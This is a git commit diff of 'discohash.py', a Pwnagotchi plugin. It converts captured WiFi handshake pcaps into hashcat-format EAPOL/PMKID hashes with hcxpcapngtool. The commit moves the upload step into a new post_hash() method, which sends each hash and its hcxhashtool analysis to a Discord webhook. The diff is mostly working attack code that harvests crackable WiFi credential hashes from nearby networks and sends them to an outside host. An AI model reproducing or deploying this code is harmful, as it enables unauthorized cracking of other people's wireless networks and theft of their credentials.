7c0a49a0bbc1579a45e9627ca55f402e7c2fbe81
flamebarke <39644720+flamebarke@users.noreply.github.com>
2022-08-25 23:28:06 +0800

    Cleaned file, added post_hash()

--- discohash.py
+++ discohash.py
@@ -1,8 +1,8 @@
+import os
+import json
 import logging
 import requests
 import subprocess
-import json
-import os
 import pwnagotchi
 import pwnagotchi.plugins as plugins
 
@@ -19,16 +19,19 @@ class discohash(plugins.Plugin):
     def __init__(self):
         logging.debug("[*] DiscoHash plugin created")
     
+
     # called when the plugin is loaded
     def on_loaded(self):
-        logging.warning(f"[*] DiscoHash plugin loaded")
+        logging.info(f"[*] DiscoHash plugin loaded")
     
+
     # called when an epoch is over (where an epoch is a single loop of the main algorithm)
     def on_epoch(self, agent, epoch, epoch_data):
         global fingerprint
         fingerprint = agent.fingerprint()
         handshake_dir = "/root/handshakes/"
         self.process_pcaps(handshake_dir)
+
 
     def process_pcaps(self, handshake_dir):
         handshakes_list = [os.path.join(handshake_dir, filename) for filename in os.listdir(handshake_dir) if filename.endswith('.pcap')]
@@ -38,68 +41,69 @@ class discohash(plugins.Plugin):
         for num, handshake in enumerate(handshakes_list):
             fullpathNoExt = handshake.split('.')[0]
             pcapFileName = handshake.split('/')[-1:][0]
-            if not os.path.isfile(fullpathNoExt + '.22000'): 
+            if not os.path.isfile(fullpathNoExt + '.22000'):
                 if self.write_hash(handshake):
                     successful_jobs.append('22000: ' + pcapFileName)
                 else:
                     failed_jobs.append('22000: ' + pcapFileName)
-                    
-                    if not os.path.isfile(fullpathNoExt + '.22000'):
+                    if not os.path.isfile(fullpathNoExt + '.22000'): 
                         lonely_pcaps.append(handshake)
-                        logging.debug('[* DiscoHash *] Batch job: added {} to lonely list'.format(pcapFileName))
-            if ((num + 1) % 10 == 0) or (num + 1 == len(handshakes_list)): 
-                logging.info('[* DiscoHash *] Batch job: {}/{} done ({} fails)'.format(num + 1,len(handshakes_list),len(lonely_pcaps)))
+                        logging.debug('[*] DiscoHash Batch job: added {} to lonely list'.format(pcapFileName))
+            if ((num + 1) % 10 == 0) or (num + 1 == len(handshakes_list)):
+                logging.debug('[*] DiscoHash Batch job: {}/{} done ({} fails)'.format(num + 1,len(handshakes_list),len(lonely_pcaps)))
         if successful_jobs:
-            logging.info('[* DiscoHash *] Batch job: {} new handshake files created'.format(len(successful_jobs)))
+            logging.debug('[*] DiscoHash Batch job: {} new handshake files created'.format(len(successful_jobs)))
         if lonely_pcaps:
-            logging.info('[* DiscoHash *] Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
+            logging.debug('[*] DiscoHash Batch job: {} networks without enough packets to create a hash'.format(len(lonely_pcaps)))
     
+
     def write_hash(self, fullpath):
         fullpathNoExt = fullpath.split('.')[0]
         filename = fullpath.split('/')[-1:][0].split('.')[0]
-        ssid = filename.split(('_')[-1:])
         result = subprocess.getoutput('hcxpcapngtool -o {}.22000 {} >/dev/null 2>&1'.format(fullpathNoExt,fullpath))
-        analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout'.format(fullpathNoExt))
         if os.path.isfile(fullpathNoExt +  '.22000'):
-            logging.info('[* DiscoHash *] [* DiscoHash *] EAPOL/PMKID Success: {}.22000 created'.format(filename))
-            
-            try:
-                hash_val = open(f'{fullpathNoExt}.22000', 'r')
-                hash_data = hash_val.read()
-
-            except Exception as e:
-                logging.info(f'[! DiscoHash !]: An error occured {e}')
-            
-            try:
-                data = {
-                    'embeds': [
-                        {
-                        'title': '(⌐■_■) {} sniffed a new hash!'.format(pwnagotchi.name()), 
-                        'color': 3553599,
-                        'description': 'SSID and hash:',
-                        'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
-                        'fields': [
-                            {
-                                'name': '{}'.format(str(ssid[0])),
-                                'value': '`{}`'.format(hash_data),
-                                'inline': False
-                            },
-                            {
-                                'name': 'Hash Analysis:',
-                                'value': '```{}```'.format(analysis),
-                                'inline': False
-                            },
-                        ],
-                        'footer': {
-                            'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{} - Creators PwnMail: 53291d7013a14b08cd8c7fea3b5de0f60f5e391f5584ac8310af5cfd96a04a4a'.format(self.__version__)
-                        }
-                        }
-                    ]
-                }
-                requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
-                logging.info('[* DiscoHash *]: Webhook sent!')
-            except Exception as e:
-                logging.info('[! DiscoHash !]: An error occured with the plugin!{}'.format(e))
+            logging.info('[+] DiscoHash EAPOL/PMKID Success: {}.22000 created'.format(filename))
+            self.post_hash(fullpathNoExt)
             return True
         else:
             return False
+
+
+    def post_hash(self, fullpathNoExt):
+        try:
+            hash_val = open(f'{fullpathNoExt}.22000', 'r')
+            hash_data = hash_val.read()
+            analysis = subprocess.getoutput('hcxhashtool -i {}.22000 --info=stdout'.format(fullpathNoExt))
+        except Exception as e:
+            logging.warning('[!] DiscoHash: An error occured {}'.format(e))
+        try:
+            data = {
+                'embeds': [
+                    {
+                    'title': '(⌐■_■) {} sniffed a new hash!'.format(pwnagotchi.name()), 
+                    'color': 3553599,
+                    'description': '__**Hash Information**__',
+                    'url': 'https://pwnagotchi.ai/pwnfile/#!{}'.format(fingerprint),
+                    'fields': [
+                        {
+                            'name': 'Hash:',
+                            'value': '`{}`'.format(hash_data),
+                            'inline': False
+                        },
+                        {
+                            'name': 'Hash Analysis:',
+                            'value': '```{}```'.format(analysis),
+                            'inline': False
+                        },
+                    ],
+                    'footer': {
+                        'text': 'Pwnagotchi v1.5.5 - DiscoHash Plugin v{} \
+                        \nAuthors PwnMail: 53291d7013a14b08cd8c7fea3b5de0f60f5e391f5584ac8310af5cfd96a04a4a'.format(self.__version__)
+                    }
+                    }
+                ]
+            }
+            requests.post(self.options['webhook_url'], files={'payload_json': (None, json.dumps(data))})
+            logging.debug('[*] DiscoHash: Webhook sent!')
+        except Exception as e:
+            logging.warning('[!] DiscoHash: An error occured with the plugin!{}'.format(e))
